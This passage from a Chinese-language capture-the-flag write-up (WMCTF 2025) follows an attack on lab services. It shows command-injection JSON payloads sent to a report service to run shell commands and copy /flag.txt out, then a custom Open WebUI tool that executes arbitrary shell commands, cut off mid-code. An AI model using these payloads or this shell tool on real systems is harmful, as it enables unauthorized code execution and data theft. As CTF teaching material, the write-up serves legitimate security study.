</span></span><span class="line"><span class="cl"><span class="n">active_defrag_key_misses</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">total_active_defrag_time</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">current_active_defrag_time</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">tracking_total_keys</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">tracking_total_items</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">tracking_total_prefixes</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">unexpected_error_replies</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">total_error_replies</span><span class="p">:</span><span class="mi">31</span>
</span></span><span class="line"><span class="cl"><span class="n">dump_payload_sanitizations</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">total_reads_processed</span><span class="p">:</span><span class="mi">18968</span>
</span></span><span class="line"><span class="cl"><span class="n">total_writes_processed</span><span class="p">:</span><span class="mi">10983</span>
</span></span><span class="line"><span class="cl"><span class="n">io_threaded_reads_processed</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">io_threaded_writes_processed</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">client_query_buffer_limit_disconnections</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">client_output_buffer_limit_disconnections</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">reply_buffer_shrinks</span><span class="p">:</span><span class="mi">39</span>
</span></span><span class="line"><span class="cl"><span class="n">reply_buffer_expands</span><span class="p">:</span><span class="mi">11</span>
</span></span><span class="line"><span class="cl"><span class="n">eventloop_cycles</span><span class="p">:</span><span class="mi">823770</span>
</span></span><span class="line"><span class="cl"><span class="n">eventloop_duration_sum</span><span class="p">:</span><span class="mi">201034186</span>
</span></span><span class="line"><span class="cl"><span class="n">eventloop_duration_cmd_sum</span><span class="p">:</span><span class="mi">43994</span>
</span></span><span class="line"><span class="cl"><span class="n">instantaneous_eventloop_cycles_per_sec</span><span class="p">:</span><span class="mi">10</span>
</span></span><span class="line"><span class="cl"><span class="n">instantaneous_eventloop_duration_usec</span><span class="p">:</span><span class="mi">256</span>
</span></span><span class="line"><span class="cl"><span class="n">acl_access_denied_auth</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">acl_access_denied_cmd</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">acl_access_denied_key</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">acl_access_denied_channel</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Replication</span>
</span></span><span class="line"><span class="cl"><span class="n">role</span><span class="p">:</span><span class="n">master</span>
</span></span><span class="line"><span class="cl"><span class="n">connected_slaves</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">master_failover_state</span><span class="p">:</span><span class="n">no</span><span class="o">-</span><span class="n">failover</span>
</span></span><span class="line"><span class="cl"><span class="n">master_replid</span><span class="p">:</span><span class="mi">4</span><span class="n">ec7a6f3c1751b9ca2bb85a60ae0aaaabf98928a</span>
</span></span><span class="line"><span class="cl"><span class="n">master_replid2</span><span class="p">:</span><span class="mi">0000000000000000000000000000000000000000</span>
</span></span><span class="line"><span class="cl"><span class="n">master_repl_offset</span><span class="p">:</span><span class="mi">24</span>
</span></span><span class="line"><span class="cl"><span class="n">second_repl_offset</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">repl_backlog_active</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">repl_backlog_size</span><span class="p">:</span><span class="mi">1048576</span>
</span></span><span class="line"><span class="cl"><span class="n">repl_backlog_first_byte_offset</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">repl_backlog_histlen</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># CPU</span>
</span></span><span class="line"><span class="cl"><span class="n">used_cpu_sys</span><span class="p">:</span><span class="mf">26.989382</span>
</span></span><span class="line"><span class="cl"><span class="n">used_cpu_user</span><span class="p">:</span><span class="mf">182.022643</span>
</span></span><span class="line"><span class="cl"><span class="n">used_cpu_sys_children</span><span class="p">:</span><span class="mf">0.000426</span>
</span></span><span class="line"><span class="cl"><span class="n">used_cpu_user_children</span><span class="p">:</span><span class="mf">0.001780</span>
</span></span><span class="line"><span class="cl"><span class="n">used_cpu_sys_main_thread</span><span class="p">:</span><span class="mf">26.988181</span>
</span></span><span class="line"><span class="cl"><span class="n">used_cpu_user_main_thread</span><span class="p">:</span><span class="mf">182.017391</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Modules</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Errorstats</span>
</span></span><span class="line"><span class="cl"><span class="n">errorstat_ERR</span><span class="p">:</span><span class="n">count</span><span class="o">=</span><span class="mi">31</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Cluster</span>
</span></span><span class="line"><span class="cl"><span class="n">cluster_enabled</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Keyspace</span>
</span></span><span class="line"><span class="cl"><span class="n">db0</span><span class="p">:</span><span class="n">keys</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span><span class="n">expires</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span><span class="n">avg_ttl</span><span class="o">=</span><span class="mi">68250416</span><span class="p">,</span><span class="n">subexpiry</span><span class="o">=</span><span class="mi">0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>版本非常新，思考能否把那个数据库文件弄下来，搞半天弄不下来，观察两个web服务30是一个老的管理系统，其中有report，而这个report我正好在redis里面看到过</p>
<p><img src="/p/wmctf-2025/2.png"
	width="850"
	height="453"
	srcset="/p/wmctf-2025/2_hu_5c7335c9a5f019e5.png 480w, /p/wmctf-2025/2_hu_2181511ce541af2c.png 1024w"
	loading="lazy"
	
		alt="img"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="450px"
	
></p>
<p><img src="/p/wmctf-2025/3.png"
	width="1280"
	height="853"
	srcset="/p/wmctf-2025/3_hu_2f1e3e317a31c1a9.png 480w, /p/wmctf-2025/3_hu_f2675f20ab0b80ef.png 1024w"
	loading="lazy"
	
		alt="img"
	
	
		class="gallery-image" 
		data-flex-grow="150"
		data-flex-basis="360px"
	
></p>
<p>所以也就是说30可以用这个打，而40是一个open webui系统，不知道怎么整</p>
<p>先打30，经过不懈努力终于睡眠了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;data&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;sales&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;period&#34;</span><span class="p">:</span> <span class="s2">&#34;monthly&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;template&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;template_type&#34;</span><span class="p">:</span> <span class="s2">&#34;dynamic&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;fields&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;sales&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;revenue&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;commands&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;sleep 5&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;date&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>由于无法判断命令是否执行，并且这是gob反序列化，一般是在<code>/app</code>所以我们尝试写入静态目录下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;data&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;sales&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;period&#34;</span><span class="p">:</span> <span class="s2">&#34;monthly&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;template&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;template_type&#34;</span><span class="p">:</span> <span class="s2">&#34;dynamic&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;fields&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;sales&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;revenue&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;commands&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;touch /app/static/1.txt &amp;&amp; sleep 5&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;date&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>成功执行，现在来获取flag即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;data&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;sales&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;period&#34;</span><span class="p">:</span> <span class="s2">&#34;monthly&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;template&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;template_type&#34;</span><span class="p">:</span> <span class="s2">&#34;dynamic&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;fields&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;sales&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;revenue&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;commands&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;tac /flag.txt &gt; /app/static/3.txt &amp;&amp; sleep 5&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;date&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后现在去打40的openai webui的1day，我们首先就要考虑能够RCE的</p>
<h2 id="shopping-company2">Shopping company2
</h2><p>by mo1u &amp;&amp; baozongwi</p>
<p><img src="/p/wmctf-2025/4.png"
	width="1214"
	height="363"
	srcset="/p/wmctf-2025/4_hu_2230ce01df7660c1.png 480w, /p/wmctf-2025/4_hu_a70832156c47eed2.png 1024w"
	loading="lazy"
	
		alt="img"
	
	
		class="gallery-image" 
		data-flex-grow="334"
		data-flex-basis="802px"
	
></p>
<p>拿到登录的账号密码，进去之后发现版本为v0.6.1 http://192.168.100.40:8080/auth?redirect=%2F</p>
<p>给open-webui加个deepseek的api，然后写一个工具，添加到open-webui的自定义工具里</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">asyncio</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Dict</span><span class="p">,</span> <span class="n">Any</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Tools</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">execute_system_command</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">timeout</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">30</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">        Execute a system command and return the output.
</span></span></span><span class="line"><span class="cl"><span class="s2">        
</span></span></span><span class="line"><span class="cl"><span class="s2">        WARNING: This tool allows execution of ANY system command without safety checks.
</span></span></span><span class="line"><span class="cl"><span class="s2">        Use with extreme caution as it can be dangerous and potentially harm your system.
</span></span></span><span class="line"><span class="cl"><span class="s2">        
</span></span></span><span class="line"><span class="cl"><span class="s2">        :param command: The system command to execute.
</span></span></span><span class="line"><span class="cl"><span class="s2">        :param timeout: Maximum time in seconds to wait for command completion.
</span></span></span><span class="line"><span class="cl"><span class="s2">        :return: The output of the command execution.
</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Execute the command with a timeout</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="n">command</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">returncode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Command executed successfully:</span><span class="se">\n</span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Command failed with error:</span><span class="se">\n</span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">stderr</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">TimeoutExpired</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Command timed out after </span><span class="si">{</span><span class="n">timeout</span><span class="si">}</span><span class="s2"> seconds.&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Error executing command: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">async</span> <span class="k">def</span> <span class="nf">execute_system_command_async</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">command</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">timeout</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">30</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">        Execute a system command asynchronously and return the output.
</span></span></span><span class="line"><span class="cl"><span class="s2">        
</span></span></span><span class="line"><span class="cl"><span class="s2">        WARNING: This tool allows execution of ANY system command without safety checks.
</span></span></span><span class="line"><span class="cl"><span class="s2">        Use with extreme caution as it can be dangerous and potentially harm your system.
</span></span></span><span class="line"><span class="cl"><span class="s2">        
</span></span></span><span class="line"><span class="cl"><span class="s2">        :param command: The system command to execute.
</span></span></span><span class="line"><span class="cl"><span class="s2">        :param timeout: Maximum time in seconds to wait for command completion.
</span></span></span><span class="line"><span class="cl"><span class="s2">        :return: The output of the command execution.
</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Execute the command asynchronously with a timeout</span>
</span></span><span class="line"><span class="cl">            <span class="n">process</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">create_subprocess_shell</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="n">command</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">stdout</span><span class="o">=</span><span class="n">asyncio</span><span class="o">.</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">stderr</span><span class="o">=</span><span class="n">asyncio</span><span class="o">.</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">wait_for</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                    <span class="n">process</span><span class="o">.</span><span class="n">communicate</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">                    <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span>
</span></span><span class="line"><span class="cl">                <span class="p">)</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">process</span><span class="o">.</span><span class="n">returncode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Command executed successfully:</span><span class="se">\n</span><span class="si">{</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Command failed with error:</span><span class="se">\n</span><span class="si">{</span><span class="n">stderr</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">TimeoutError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">process</span><span class="o">.</span><span class="n">kill</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">await</span> <span class="n">process</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Command timed out after </span><span class="si">{</span><span class="n">timeout</span><span class="si">}</span><span class="s2"> seconds.&#34;</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Error executing command: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">list_directory_contents</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;.&#34;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">        List the contents of a directory.
</span></span></span><span class="line"><span class="cl"><span class="s2">        
</span></span></span><span class="line"><span class="cl"><span class="s2">        :param path: The directory path to list. Defaults to current directory.
</span></span></span><span class="line"><span class="cl"><span class="s2">        :return: A formatted string with directory contents.
